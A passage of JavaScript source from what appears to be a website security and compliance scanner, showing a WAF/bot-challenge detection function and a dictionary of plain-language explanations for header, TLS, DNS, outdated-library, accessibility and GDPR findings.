  const isCfHeader = cfMitigated === 'challenge' || serverTiming.includes('chlray') || ((status === 403 || status === 429) && server.includes('cloudflare'));
  const isCfTitle = /<title>(?:Just a moment\.\.\.|Attention Required! \| Cloudflare)<\/title>/i.test(b);
  const isCfInterstitial = isCfTitle ||
    ((status === 403 || status === 429 || status === 503) && /cf-turnstile|challenges\.cloudflare\.com|challenge-platform|__cf_chl_/i.test(b)) ||
    (b.length < 25000 && /__cf_chl_opt/i.test(b) && !/<(?:main|article|nav|header|footer)/i.test(b));
  if (isCfHeader || isCfInterstitial) {
    return { isWaf: true, provider: 'Cloudflare' };
  }

  // 3. DataDome
  const isDataDomeHeader = Boolean(xDataDome) || server.includes('datadome');
  const isDataDomeCookie = cookieStr.includes('datadome');
  const isDataDomeBlock = /geo\.captcha-delivery\.com/i.test(b) || ((status === 403 || status === 429) && (/datadome/i.test(b) || isDataDomeHeader || isDataDomeCookie));
  if (isDataDomeBlock) {
    return { isWaf: true, provider: 'DataDome' };
  }

  // 4. Akamai
  const isAkamaiHeader = server.includes('akamai') || server.includes('ghost') || Boolean(headers['x-akamai-transformed']);
  const isAkamaiBody = /Reference\s*#[0-9a-f.]+|AkamaiGHost|You don't have permission to access/i.test(b);
  if (isAkamaiHeader || isAkamaiBody) {
    if (status === 403 || status === 429 || (isAkamaiBody && /access denied/i.test(b))) {
      return { isWaf: true, provider: 'Akamai' };
    }
  }

  // 5. AWS WAF / CloudFront
  const isAwsWafHeader = Boolean(xAmznWaf);
  const isAwsWafCookie = cookieStr.includes('awswaf');
  const isCloudFrontError = (status === 403 || status === 429) && (via.includes('cloudfront') || /Generated by cloudfront|The request could not be satisfied/i.test(b));
  if (isAwsWafHeader || isAwsWafCookie || isCloudFrontError || /awswaf/i.test(b)) {
    return { isWaf: true, provider: 'AWS WAF' };
  }

  // 6. Vercel Bot Mitigation / Security Checkpoint
  const xVercelMitigated = String(headers['x-vercel-mitigated'] || '').toLowerCase();
  const isVercelHeader = xVercelMitigated === 'challenge' || ((status === 403 || status === 429) && (Boolean(headers['x-vercel-challenge-token']) || server.includes('vercel')));
  const isVercelBody = /<title>Vercel Security Checkpoint<\/title>|Vercel Security Checkpoint/i.test(b);
  if ((status === 403 || status === 429) && (isVercelHeader || isVercelBody)) {
    return { isWaf: true, provider: 'Vercel' };
  }
  if (isVercelBody && b.length < 50000) {
    return { isWaf: true, provider: 'Vercel' };
  }

  // 7. Hostinger CDN / hcdn Bot Challenge
  const isHostinger = server.includes('hcdn') || String(headers['platform'] || '').toLowerCase().includes('hostinger');
  const isHostingerChallenge = /Checking your browser before accessing/i.test(b) ||
    /\/hcdn-cgi\/jschallenge/i.test(b) ||
    /Please wait for up to 5 seconds/i.test(b);
  if (isHostingerChallenge || (isHostinger && (status === 403 || status === 429))) {
    return { isWaf: true, provider: 'Hostinger' };
  }

  // 8. Generic WAF / Bot challenge
  if (status === 403 || status === 429) {
    if (b.length < 4096 && /access denied|request forbidden|bot detection|unusual traffic|firewall|rate limit|security challenge|please verify you are human|turnstile|captcha|security block|blocked by administrative/i.test(b)) {
      return { isWaf: true, provider: server.includes('cloudflare') ? 'Cloudflare' : 'Generic WAF' };
    }
    if (b.length < 2048) {
      return { isWaf: true, provider: server.includes('cloudflare') ? 'Cloudflare' : 'Generic WAF' };
    }
  }

  // 9. Explicit block / HTTP error body (e.g. from headless DOM or unparsed status)
  const isExplicitBlock = b.length < 10000 && (
    /<title>[^<]*(?:403\s+Forbidden|401\s+Unauthorized|429\s+Too\s+Many|503\s+Service|Access\s+Denied|Request\s+Forbidden)[^<]*<\/title>/i.test(b) ||
    /<h[12]>[^<]*(?:403\s+Forbidden|Access\s+Denied|Request\s+forbidden|Administrative\s+rules)[^<]*<\/h[12]>/i.test(b) ||
    (/openresty/i.test(b) && /403\s+Forbidden/i.test(b)) ||
    (/cloudflare/i.test(b) && /error\s+10\d\d/i.test(b))
  );
  if (isExplicitBlock) {
    return { isWaf: true, provider: server.includes('cloudflare') || /cloudflare/i.test(b) ? 'Cloudflare' : 'Server WAF/Block' };
  }

  return { isWaf: false, provider: null };
}

function isWafChallenge(res, body) {
  return detectWaf(res, body).isWaf;
}

/* ------------------------------------------------------------------ *
 * "Proof / what it means" explanation layer.
 * Every finding gets a plain-language block: what it is, who can act on
 * it, the real-world impact, and the worst case if left unfixed.
 * ------------------------------------------------------------------ */

const GENERIC_EXPLAIN = {
  whatItIs: 'A weakness a scanner detected on this page.',
  whoCanAct: 'Anyone who can reach the site over the network.',
  impact: 'Increases attack surface and can undermine user trust or compliance.',
  worstCase: 'Left unfixed it can be chained with other issues into a real compromise.',
};

const EXPLAIN = {
  'waf-challenge-intercepted': {
    whatItIs: 'An automated WAF / Bot Management challenge intercepted the crawler request.',
    whoCanAct: 'Webmasters configuring WAF / bot mitigation rules.',
    impact: 'Automated crawlers that do not execute JavaScript challenges see the interstitial page rather than site content.',
    worstCase: 'Certain crawlers or search engines may be hindered from indexing if bot protection rules are too aggressive.',
  },
  'eu-cookie-excessive-duration': {
    whatItIs: 'One or more cookies set a Max-Age exceeding 13 months (34,164,000 seconds).',
    whoCanAct: 'Data-protection regulators reviewing ePrivacy and GDPR retention compliance.',
    impact: 'Long-lived tracking or session identifiers persist longer than EDPB/CNIL 13-month guidance.',
    worstCase: 'Regulatory finding under GDPR Art. 5(1)(e) storage limitation / data minimisation rules.',
  },
  'seo-private-noindex': {
    whatItIs: 'Both robots.txt (`Disallow: /`) and `<meta name="robots" content="noindex">` opt the page out of search indexing.',
    whoCanAct: 'Site owners and developers intentionally gating a private or authenticated portal.',
    impact: 'Search engines exclude the page from results, so public SERP/structured-data checks are skipped.',
    worstCase: 'Informational only unless applied accidentally to a public marketing page.',
  },
  'tls-untrusted': {
    whatItIs: 'The HTTPS certificate could not be verified against a trusted root.',
    whoCanAct: 'Attackers positioned on the network (public Wi-Fi, ISP) can impersonate the site.',
    impact: 'Browsers show a scary warning; users may click through and lose data to a fake site.',
    worstCase: 'Full man-in-the-middle: passwords and cookies stolen, sessions hijacked.',
  },
  'tls-expiring': {
    whatItIs: 'The certificate expires very soon.',
    whoCanAct: 'No attacker needed — the site will break on its own.',
    impact: 'On expiry every visitor is blocked by a full-page interstitial.',
    worstCase: 'Total outage until the cert is renewed; lost sales and SEO ranking.',
  },
  'tls-old-protocol': {
    whatItIs: 'The server still negotiates an outdated TLS version (e.g. TLS 1.0/1.1).',
    whoCanAct: 'Network attackers can exploit known flaws in those older protocol versions.',
    impact: 'Traffic can potentially be decrypted or downgraded.',
    worstCase: 'Cryptographic weaknesses in the old protocol leak encrypted data.',
  },
  'disclosure': {
    whatItIs: 'A response header reveals the software and its version.',
    whoCanAct: 'Anyone — headers are public.',
    impact: 'The exact stack/version is handed to an attacker for CVE matching.',
    worstCase: 'A known exploit for that version is fired at you immediately.',
  },
  'no-https': {
    whatItIs: 'The site is served over unencrypted HTTP.',
    whoCanAct: 'Anyone on the path (coffee-shop Wi-Fi, ISP, hostile router) can read or alter traffic.',
    impact: 'Everything typed into the site is visible in plain text; content can be injected.',
    worstCase: 'Credentials and payment data stolen; malicious scripts injected into pages.',
  },
  'hdr-strict-transport-security': {
    whatItIs: 'No HSTS header — the browser is not told to only ever use HTTPS.',
    whoCanAct: 'A network attacker can strip HTTPS and downgrade the first request to HTTP.',
    impact: 'The protection of HTTPS can be bypassed on the very first visit.',
    worstCase: 'SSL-stripping attack silently serves a fake HTTP clone and steals logins.',
  },
  'hdr-content-security-policy': {
    whatItIs: 'No Content-Security-Policy — the browser has no rules for what may load/run.',
    whoCanAct: 'Anyone who can get script into the page (stored/reflected XSS, bad ad, third-party lib).',
    impact: 'Malicious scripts run with full access to the page and its cookies.',
    worstCase: 'Session/token theft and account takeover via injected JavaScript.',
  },
  'csp-weak': {
    whatItIs: 'The CSP allows unsafe-inline/unsafe-eval, which defeats most of its XSS protection.',
    whoCanAct: 'An attacker who can inject markup into the page.',
    impact: 'The safety net you deployed does not actually stop inline script execution.',
    worstCase: 'XSS slips straight through despite a CSP being "present".',
  },
  'cookie-insecure': {
    whatItIs: 'A cookie can be sent over plain HTTP because it lacks the Secure flag.',
    whoCanAct: 'A network attacker who can force an HTTP request (downgrade, mixed content).',
    impact: 'The cookie value leaks in cleartext over the wire.',
    worstCase: 'Session cookie captured → attacker logs in as the user.',
  },
  'cookie-httponly': {
    whatItIs: 'A cookie is readable by JavaScript because it lacks HttpOnly.',
    whoCanAct: 'Anyone who achieves XSS on the site.',
    impact: 'Injected scripts can read the cookie directly.',
    worstCase: 'One XSS bug becomes instant, durable account takeover.',
  },
  'cookie-samesite': {
    whatItIs: 'A cookie has no SameSite attribute.',
    whoCanAct: 'A malicious third-party site the user visits.',
    impact: 'The cookie is sent on cross-site requests.',
    worstCase: 'CSRF attacks perform actions as the logged-in user.',
  },
  'mixed-content': {
    whatItIs: 'Some resources load over plain HTTP on an HTTPS page.',
    whoCanAct: 'A network attacker can tamper with those specific resources.',
    impact: 'Browsers block them (broken UI) or render them insecurely.',
    worstCase: 'An attacker swaps a script/iframe for a malicious one.',
  },
  'secret-leak': {
    whatItIs: 'Something that looks like a live credential is shipped to the browser.',
    whoCanAct: 'Literally anyone — it is public in the page source / JS bundle.',
    impact: 'The key can be used to bill you, read data, or send email as you.',
    worstCase: 'Cloud account drained, data exfiltrated, mail sent to your customers.',
  },
  'infra-paths': {
    whatItIs: 'The page references sensitive infra files (.env, .git, backups...).',
    whoCanAct: 'Anyone who guesses the path.',
    impact: 'If the file is actually served, source/credentials leak directly.',
    worstCase: 'Full repo or environment (DB passwords) download in one request.',
  },
  'sourcemaps': {
    whatItIs: 'Source maps are published alongside the production JavaScript.',
    whoCanAct: 'Any visitor with dev tools.',
    impact: 'Un-minified original source, comments and internal logic are readable.',
    worstCase: 'Hidden endpoints, feature flags and auth logic become trivial to study.',
  },
  'insecure-form': {
    whatItIs: 'A form submits its data over plain HTTP.',
    whoCanAct: 'A network attacker on the path.',
    impact: 'Form input (names, emails, passwords) travels in cleartext.',
    worstCase: 'Credential capture and identity theft from a login/contact form.',
  },
  'dns-spf': {
    whatItIs: 'The domain has no SPF record, so mail servers cannot verify who may send as @yourdomain.',
    whoCanAct: 'Any spammer can spoof your domain.',
    impact: 'Phishing emails appear to come from you legitimately.',
    worstCase: 'Brand-damaging phishing and your own mail landing in spam.',
  },
  'dns-dmarc': {
    whatItIs: 'No DMARC policy tells receivers what to do with spoofed mail.',
    whoCanAct: 'Attackers sending forged mail as your domain.',
    impact: 'Spoofed mail is delivered with no enforcement.',
    worstCase: 'CEO-fraud / invoice-fraud emails that look 100% legitimate.',
  },
  'dns-caa': {
    whatItIs: 'No CAA record limits which certificate authorities may issue certs for the domain.',
    whoCanAct: 'Any CA tricked (or compromised) into issuing for your domain.',
    impact: 'An attacker can obtain a valid-looking certificate for your domain.',
    worstCase: 'Trusted-looking HTTPS site that impersonates you.',
  },
  'cors-wildcard-credentials': {
    whatItIs: 'CORS allows any origin *and* credentials at the same time.',
    whoCanAct: 'Any website the victim visits can read authenticated responses.',
    impact: 'Authenticated API data is exposed cross-origin.',
    worstCase: 'Any page on the internet can silently read a logged-in user\'s data.',
  },
  'cors-wildcard': {
    whatItIs: 'CORS is wide open (Access-Control-Allow-Origin: *).',
    whoCanAct: 'Any website can read public responses from this API.',
    impact: 'Fine for truly public data, risky if any response is sensitive.',
    worstCase: 'Accidentally-exposed user data readable by any origin.',
  },
  'js-secret': {
    whatItIs: 'A JavaScript bundle contains what looks like a credential.',
    whoCanAct: 'Anyone — the bundle is downloaded by every visitor.',
    impact: 'The key/token can be reused outside your app.',
    worstCase: 'Service abuse, data access, or billing fraud using your key.',
  },
  'exposed-path': {
    whatItIs: 'A common sensitive file is reachable directly on the web server.',
    whoCanAct: 'Anyone who guesses the standard filename.',
    impact: 'The file\'s contents (config, history, backups) are downloadable.',
    worstCase: 'Credentials or full source disclosure in a single GET.',
  },
  'broken-link': {
    whatItIs: 'An internal link on the site is broken (returns an error).',
    whoCanAct: 'No attacker needed — visitors hit it.',
    impact: 'Dead ends frustrate users and leak crawl budget to search engines.',
    worstCase: 'Key conversion paths (pricing, signup) silently 404.',
  },
  'tech-detected': {
    whatItIs: 'The stack is fingerprinted from headers and markup.',
    whoCanAct: 'Attackers use this to target known CVEs for that exact version.',
    impact: 'Tells an attacker precisely which exploits to try.',
    worstCase: 'An unpatched CMS/plugin version is matched to a public exploit.',
  },
  'hdr-cross-origin-opener-policy': {
    whatItIs: 'The page does not isolate itself from cross-origin windows (COOP).',
    whoCanAct: 'A malicious site that opens or is opened by your page.',
    impact: 'It can keep a live reference to your window and probe it (XS-Leaks).',
    worstCase: 'Cross-origin data leakage or Spectre-class side-channel access.',
  },
  'hdr-cross-origin-resource-policy': {
    whatItIs: 'Any origin can embed this site\'s resources in its own pages.',
    whoCanAct: 'Third-party sites hot-linking or embedding your assets.',
    impact: 'Bandwidth theft and content being framed out of context.',
    worstCase: 'Your assets appear inside an attacker\'s page, aiding brand spoofing.',
  },
  'hdr-cross-origin-embedder-policy': {
    whatItIs: 'The page is not cross-origin isolated (COEP missing).',
    whoCanAct: 'No direct attacker; it is a missing defence-in-depth control.',
    impact: 'You cannot opt into cross-origin isolation for sensitive APIs.',
    worstCase: 'Hardening for Spectre-class attacks is unavailable.',
  },
  'csp-no-trusted-types': {
    whatItIs: 'The CSP does not require Trusted Types for DOM sinks.',
    whoCanAct: 'Anyone able to inject a DOM script into the page.',
    impact: 'DOM-based XSS is not blocked where scripts are assigned to sinks.',
    worstCase: 'A stored/injected payload executes in a victim\'s authenticated session.',
  },
  'csp-no-object-src': {
    whatItIs: 'The CSP does not restrict plugin content (`object-src`).',
    whoCanAct: 'An attacker who can place <object>/<embed> markup.',
    impact: 'Legacy plugin content can execute code.',
    worstCase: 'XSS via an unrestricted plugin resource.',
  },
  'csp-no-base-uri': {
    whatItIs: 'The CSP does not lock the document base URI.',
    whoCanAct: 'An attacker who can inject a <base> tag.',
    impact: 'All relative URLs (including scripts) are redirected to the attacker.',
    worstCase: 'Full script hijack of every relative resource on the page.',
  },
  'csp-no-frame-ancestors': {
    whatItIs: 'Nothing prevents any origin from framing the page.',
    whoCanAct: 'Anyone who embeds your site in an iframe.',
    impact: 'Clickjacking / UI-redress attacks are possible.',
    worstCase: 'Users tricked into clicking attacker-controlled overlays (money, permissions).',
  },
  'csp-no-upgrade-insecure': {
    whatItIs: 'Sub-resources over http:// are not auto-upgraded.',
    whoCanAct: 'A network attacker on the same path.',
    impact: 'Mixed-content requests stay insecure.',
    worstCase: 'Injected sub-resource over plain HTTP (script/CSS) compromises the page.',
  },
  'csp-http-source': {
    whatItIs: 'The CSP whitelists plain-http origins.',
    whoCanAct: 'A network attacker who can serve that http:// origin.',
    impact: 'Whitelisted scripts/styles load unencrypted and can be tampered with.',
    worstCase: 'Injected script from the http:// source runs with full page privileges.',
  },
  'csp-no-default-src': {
    whatItIs: 'The CSP has no `default-src` fallback.',
    whoCanAct: 'No direct attacker; a policy gap.',
    impact: 'Resource types you did not explicitly list are unrestricted.',
    worstCase: 'An unlisted resource type (e.g. connect-src) is left wide open.',
  },
  'hsts-weak-maxage': {
    whatItIs: 'HSTS is enabled but with a short max-age.',
    whoCanAct: 'A network attacker during the short validity window.',
    impact: 'There is a recurring window where the first request can be downgraded.',
    worstCase: 'Cookie/session interception via an SSL-strip style downgrade.',
  },
  'hsts-no-preload': {
    whatItIs: 'HSTS lacks includeSubDomains and/or preload.',
    whoCanAct: 'A network attacker against subdomains.',
    impact: 'Subdomains and the very first visit are not protected.',
    worstCase: 'Downgrade attack on a subdomain before HSTS is learned.',
  },
  'hdr-deprecated': {
    whatItIs: 'A deprecated security header is still being sent.',
    whoCanAct: 'No direct attacker; it is dead weight / a misconfiguration signal.',
    impact: 'The header no longer protects anything.',
    worstCase: 'Misleading config that hides the real (missing) control.',
  },
  'deprecated-document-domain': {
    whatItIs: 'The page calls `document.domain` to relax its origin.',
    whoCanAct: 'Any other origin sharing the relaxed domain.',
    impact: 'Origin isolation is weakened.',
    worstCase: 'A compromised subdomain reads this origin\'s data.',
  },
  'dns-mta-sts': {
    whatItIs: 'No MTA-STS policy to force TLS for inbound mail.',
    whoCanAct: 'A network attacker positioned to intercept SMTP.',
    impact: 'Mail can be delivered over an unencrypted/downgraded channel.',
    worstCase: 'Silent interception of email in transit.',
  },
  'dns-tls-rpt': {
    whatItIs: 'No TLS-RPT report address for mail TLS failures.',
    whoCanAct: 'No direct attacker; a visibility gap.',
    impact: 'You never learn when inbound TLS fails or is downgraded.',
    worstCase: 'Ongoing SMTP downgrade goes unnoticed.',
  },
  'server-version-leak': {
    whatItIs: 'An HTTP response header explicitly discloses exact software or runtime version banners.',
    whoCanAct: 'Attackers mapping the perimeter looking for specific known CVEs.',
    impact: 'Attackers skip the reconnaissance phase and immediately test version-specific exploits.',
    worstCase: 'Immediate targeting with zero-day or known unpatched exploits matching that exact version.',
  },
  'vuln-php-eol': {
    whatItIs: 'The web server discloses an End-of-Life PHP runtime (< 8.2) containing known Remote Code Execution (RCE) vulnerabilities.',
    whoCanAct: 'Remote unauthenticated attackers capable of sending HTTP queries.',
    impact: 'Vulnerable to critical flaws including CVE-2024-4577 (Windows CGI argument injection RCE), CVE-2024-8926, and CVE-2024-9026.',
    worstCase: 'Arbitrary server takeover, web shell placement, and full database exfiltration.',
  },
  'vuln-php-81-eol': {
    whatItIs: 'The web server runs PHP 8.1, which reached official End-of-Life and receives no upstream security patches.',
    whoCanAct: 'Attackers discovering vulnerabilities in unmaintained versions.',
    impact: 'Newly discovered PHP vulnerabilities will never be patched for this version.',
    worstCase: 'Exploitation of unpatched core PHP memory safety or parsing flaws.',
  },
  'vuln-apache-outdated': {
    whatItIs: 'The server discloses an Apache HTTP Server version prior to 2.4.60 with known SSRF and proxy escape vulnerabilities.',
    whoCanAct: 'Remote attackers crafting malformed requests or path traversal patterns.',
    impact: 'Vulnerable to CVE-2024-38472 (UNC SSRF), CVE-2024-38475 (mod_rewrite bypass), and CVE-2024-39573.',
    worstCase: 'Internal network SSRF, bypass of access controls, or arbitrary command execution via CGI/proxy handlers.',
  },
  'vuln-nodejs-eol': {
    whatItIs: 'The application runs on an End-of-Life Node.js runtime (< v20) missing recent security releases.',
    whoCanAct: 'Attackers crafting malformed HTTP requests.',
    impact: 'Misses critical security releases for HTTP request smuggling and permission model escapes.',
    worstCase: 'HTTP request smuggling leading to cache poisoning and unauthorized request execution.',
  },
  'vuln-nginx-outdated': {
    whatItIs: 'The server discloses an outdated Nginx version lacking recent HTTP/2 and HTTP/3 stability and security fixes.',
    whoCanAct: 'Network attackers sending malformed HTTP/2 or HTTP/3 frames.',
    impact: 'Susceptible to worker process crashes and memory corruption (e.g. CVE-2024-34161).',
    worstCase: 'Denial of service through continuous worker termination.',
  },
  'vuln-jquery-outdated': {
    whatItIs: 'The page loads an outdated jQuery version (< 3.5.0) with known Cross-Site Scripting (XSS) vulnerabilities.',
    whoCanAct: 'Attackers passing untrusted HTML/DOM input into jQuery selectors or manipulation methods.',
    impact: 'Known htmlPrefilter regex flaws allow arbitrary script execution (CVE-2020-11022, CVE-2020-11023).',
    worstCase: 'Stored or reflected Cross-Site Scripting, session token theft, and account takeover.',
  },
  'vuln-angularjs-eol': {
    whatItIs: 'The application loads legacy AngularJS 1.x, which reached End-of-Life on December 31, 2021.',
    whoCanAct: 'Attackers exploiting client-side template injection (CSTI) and expression sandbox escapes.',
    impact: 'Dozens of public sandbox escape exploits allow executing arbitrary JS in the user browser.',
    worstCase: 'Universal Cross-Site Scripting on any page with user-controlled templates.',
  },
  'vuln-polyfill-malicious': {
    whatItIs: 'The website imports JavaScript from polyfill.io, bootcdn.net, or related compromised CDN domains.',
    whoCanAct: 'Rogue operator controlling hijacked CDN domains (CVE-2024-38521).',
    impact: 'The CDN selectively injects malware, drive-by downloads, and phishing redirects into mobile visitors\' browsers.',
    worstCase: 'Complete site defacement, credential harvesting, and customer fraud under your domain.',
  },
  'vuln-wordpress-outdated': {
    whatItIs: 'The site runs an outdated WordPress core release containing known critical vulnerabilities.',
    whoCanAct: 'Remote unauthenticated or authenticated attackers targeting WordPress endpoints.',
    impact: 'Vulnerable to known core CVEs including SSRF/RCE in media blocks (CVE-2024-4439) and privilege escalation (CVE-2024-31210).',
    worstCase: 'Administrative account takeover, arbitrary plugin/shell upload, and database exfiltration.',
  },
  'vuln-nextjs-ssrf': {
    whatItIs: 'The site runs Next.js < 14.1.1 with known Server Actions SSRF and cache poisoning vulnerabilities.',
    whoCanAct: 'Remote attackers sending manipulated Host headers to Server Actions endpoints.',
    impact: 'Vulnerable to CVE-2024-34351 (SSRF via Server Actions redirect handling) and cache poisoning.',
    worstCase: 'Internal cloud metadata extraction (AWS IMDS, GCP) and private microservice credential theft.',
  },
  'vuln-lodash-outdated': {
    whatItIs: 'The site loads an outdated version of Lodash (< 4.17.21) with known prototype pollution vulnerabilities.',
    whoCanAct: 'Attackers providing crafted JSON or query parameters to object merging utilities.',
    impact: 'Prototype pollution via _.merge and template injection (CVE-2020-8203, CVE-2021-23337).',
    worstCase: 'Application logic subversion, denial of service, or remote command execution.',
  },
  'vuln-bootstrap-outdated': {
    whatItIs: 'The site loads Bootstrap < 4.3.1 or legacy Bootstrap 3.x with known XSS vulnerabilities.',
    whoCanAct: 'Attackers injecting HTML or data attributes into components with tooltips, popovers, or scrollspy.',
    impact: 'Known Cross-Site Scripting via unescaped data-attributes (CVE-2019-8331, CVE-2018-14041).',
    worstCase: 'Execution of malicious JavaScript, session hijacking, and DOM spoofing.',
  },
  'vuln-moment-redos': {
    whatItIs: 'The site loads Moment.js < 2.29.4 with known Regular Expression Denial of Service (ReDoS) flaws.',
    whoCanAct: 'Remote attackers providing malformed date strings or locale paths.',
    impact: 'Exponential regex backtracking stalls Node.js or browser threads (CVE-2022-31129, CVE-2022-24785).',
    worstCase: 'Denial of service via thread exhaustion.',
  },
  'vuln-axios-outdated': {
    whatItIs: 'The application loads Axios < 1.7.4 with known SSRF and credential leak vulnerabilities.',
    whoCanAct: 'Attackers inducing HTTP requests that redirect across origins.',
    impact: 'Axios leaks Authorization headers across cross-origin redirects (CVE-2023-45857) or bypasses SSRF restrictions (CVE-2024-39338).',
    worstCase: 'Confidential bearer tokens or API keys leaked to untrusted origins.',
  },

  /* ------------------------------------------------------------------ *
   * Coverage for the finding families that previously fell through to
   * GENERIC_EXPLAIN (accessibility, SEO, performance, EU compliance and
   * the active probes). Without these entries those cards read
   * "A weakness a scanner detected on this page", which is exactly the
   * vague explanation this layer exists to remove.
   * ------------------------------------------------------------------ */

  /* ---- accessibility (quality exposure, not an attack vector) ---- */
  'a11y-alt': {
    whatItIs: 'One or more <img> elements carry no alt attribute, so no text alternative exists.',
    whoCanAct: 'No attacker — screen-reader and low-bandwidth users are the ones excluded.',
    impact: 'Blind users hear "image" with no description; search engines cannot read the image intent.',
    worstCase: 'Fails WCAG 2.2 AA and the EU Accessibility Act — legal exposure and lost customers.',
  },
  'a11y-alt-rendered': {
    whatItIs: 'Images injected by JavaScript have no alt text in the live DOM.',
    whoCanAct: 'No attacker — assistive-tech users are excluded.',
    impact: 'The static scan saw nothing, so the gap ships silently to production.',
    worstCase: 'A persistent WCAG 2.2 · 1.1.1 failure across every JS-rendered view.',
  },
  'a11y-autocomplete': {
    whatItIs: 'Personal-data form fields have no autocomplete token.',
    whoCanAct: 'No attacker — users with motor or cognitive disabilities must hand-type everything.',
    impact: 'Slower, error-prone checkout and signup; higher abandonment.',
    worstCase: 'A WCAG 2.2 · 1.3.5 / 3.3.2 failure and a materially worse conversion rate.',
  },
  'a11y-autoplay': {
    whatItIs: 'Media plays automatically with sound and no obvious control.',
    whoCanAct: 'No attacker — it hijacks the user audio channel.',
    impact: 'Screen readers and assistive audio are drowned out; users leave the page.',
    worstCase: 'A WCAG 2.2 · 1.4.2 / 2.2.2 failure — audio cannot be paused or stopped.',
  },
  'a11y-button-semantics': {
    whatItIs: 'Clickable controls are anchors without an href (links used as buttons).',
    whoCanAct: 'No attacker — keyboard and screen-reader users cannot trigger them.',
    impact: 'Assistive tech announces "link" for an action, and Enter/Space does not activate it.',
    worstCase: 'A WCAG 2.2 · 4.1.2 / 2.1.1 failure — core UI is unreachable without a mouse.',
  },
  'a11y-contrast': {
    whatItIs: 'Text/background colour contrast is below the WCAG AA ratio.',
    whoCanAct: 'No attacker — low-vision users cannot read the text.',
    impact: 'Content is unreadable in bright light or for the ~1 in 12 men with colour-vision issues.',
    worstCase: 'A WCAG 2.2 · 1.4.3 failure — the page is legally non-compliant and commercially inaccessible.',
  },
  'a11y-focus-visible': {
    whatItIs: 'CSS removes the focus outline with no replacement style.',
    whoCanAct: 'No attacker — keyboard-only users lose their position on the page.',
    impact: 'Users cannot tell which control will activate; keyboard navigation becomes guesswork.',
    worstCase: 'A WCAG 2.2 · 2.4.7 / 1.4.11 failure — the site is unusable without a mouse.',
  },
  'a11y-h1': {
    whatItIs: 'The page has no top-level <h1> heading.',
    whoCanAct: 'No attacker — the document outline is ambiguous for assistive tech.',
    impact: 'Screen readers cannot announce the page topic; search engines get a weak relevance signal.',
    worstCase: 'A WCAG 2.2 · 1.3.1 failure plus weaker ranking for the page main keyword.',
  },
  'a11y-h1-multi': {
    whatItIs: 'The page has more than one <h1>.',
    whoCanAct: 'No attacker — the heading outline is flattened.',
    impact: 'Multiple top-level headings confuse screen-reader navigation and dilute SEO focus.',
    worstCase: 'A WCAG 2.2 · 1.3.1 failure and an inconsistent heading structure site-wide.',
  },
  'a11y-heading-order': {
    whatItIs: 'Heading levels are skipped (for example h2 to h4).',
    whoCanAct: 'No attacker — non-visual navigation breaks.',
    impact: 'Assistive-tech users cannot infer the section hierarchy.',
    worstCase: 'A WCAG 2.2 · 1.3.1 failure; deep sections become unreachable by heading jump.',
  },
  'a11y-label': {
    whatItIs: 'Form controls have no programmatic label.',
    whoCanAct: 'No attacker — screen-reader and voice-control users cannot identify the field.',
    impact: 'Users cannot complete forms, and voice commands have no target name.',
    worstCase: 'A WCAG 2.2 · 1.3.1 / 4.1.2 failure — checkout and signup are blocked.',
  },
  'a11y-landmark': {
    whatItIs: 'The primary content is not wrapped in a <main> landmark.',
    whoCanAct: 'No attacker — assistive tech cannot jump to the content.',
    impact: 'Every page requires tabbing through the whole navigation.',
    worstCase: 'A WCAG 2.2 · 1.3.1 / 2.4.1 failure across the site.',
  },
  'a11y-lang': {
    whatItIs: 'The <html> element has no lang attribute.',
    whoCanAct: 'No attacker — screen readers guess the pronunciation language.',
    impact: 'Content is read in the wrong language or accent; translation tools misfire.',
    worstCase: 'A WCAG 2.2 · 3.1.1 failure — the page is unintelligible to non-visual users.',
  },
  'a11y-link-text': {
    whatItIs: 'Links have non-descriptive text (such as "click here" or "read more").',
    whoCanAct: 'No attacker — screen-reader users hear a list of identical links.',
    impact: 'Link purpose is unknowable when read out of context.',
    worstCase: 'A WCAG 2.2 · 2.4.4 / 2.4.9 failure.',
  },
  'a11y-live-region': {
    whatItIs: 'Dynamic status messages are not exposed through an ARIA live region.',
    whoCanAct: 'No attacker — screen-reader users miss every update.',
    impact: 'Cart changes, form errors and toasts are silent.',
    worstCase: 'A WCAG 2.2 · 4.1.3 failure — the app appears frozen to non-visual users.',
  },
  'a11y-reduced-motion': {
    whatItIs: 'CSS animations run with no prefers-reduced-motion fallback.',
    whoCanAct: 'No attacker — motion-sensitive users are affected.',
    impact: 'Can trigger vestibular discomfort, nausea and migraine.',
    worstCase: 'A WCAG 2.2 · 2.3.3 failure — a genuine health and safety issue.',
  },
  'a11y-skip-link': {
    whatItIs: 'There is no "skip to content" link.',
    whoCanAct: 'No attacker — keyboard users must tab through the entire nav on every page.',
    impact: 'The navigation cost multiplies across the whole site.',
    worstCase: 'A WCAG 2.2 · 2.4.1 failure.',
  },
  'a11y-statement': {
    whatItIs: 'No accessibility statement page was found.',
    whoCanAct: 'No attacker — a compliance and transparency gap.',
    impact: 'Users cannot report barriers or see your conformance target.',
    worstCase: 'The EU Accessibility Act and public-sector rules expect a published statement.',
  },
  'a11y-table-headers': {
    whatItIs: 'Data tables use no <th> header cells.',
    whoCanAct: 'No attacker — screen readers cannot associate cells with columns.',
    impact: 'Tabular data is read as an unstructured stream of numbers.',
    worstCase: 'A WCAG 2.2 · 1.3.1 failure — financial and data tables become unusable.',
  },
  'a11y-title': {
    whatItIs: 'The page has a missing or empty <title>.',
    whoCanAct: 'No attacker — orientation is lost.',
    impact: 'Browser tabs, bookmarks and screen readers show no page name.',
    worstCase: 'A WCAG 2.2 · 2.4.2 failure plus a broken SEO title.',
  },
  'a11y-zoom': {
    whatItIs: 'Pinch-zoom is disabled via user-scalable=no or maximum-scale=1.',
    whoCanAct: 'No attacker — low-vision users cannot magnify the page.',
    impact: 'Users are forced to read tiny text they cannot enlarge.',
    worstCase: 'A WCAG 2.2 · 1.4.4 failure — a direct accessibility barrier.',
  },

  /* ---- EU / GDPR compliance ---- */
  'eu-no-cmp': {
    whatItIs: 'Trackers run with no detectable consent mechanism.',
    whoCanAct: 'A data-protection authority and any user who complains; no attacker needed.',
    impact: 'Non-essential cookies and identifiers are set before consent — unlawful processing.',
    worstCase: 'A GDPR Art. 6-7 + ePrivacy Art. 5(3) breach; fines up to 4% of global turnover.',
  },
  'eu-consent-mode-default': {
    whatItIs: 'Consent Mode does not default to denied before opt-in.',
    whoCanAct: 'A regulator — the default state already leaks data.',
    impact: 'Analytics and ad storage are granted before the user consents.',
    worstCase: 'An EDPB / Consent Mode v2 breach — pre-consent data leakage is provable from the tag order.',
  },
  'eu-pre-consent-firing': {
    whatItIs: 'Trackers appear to fire before the user consents.',
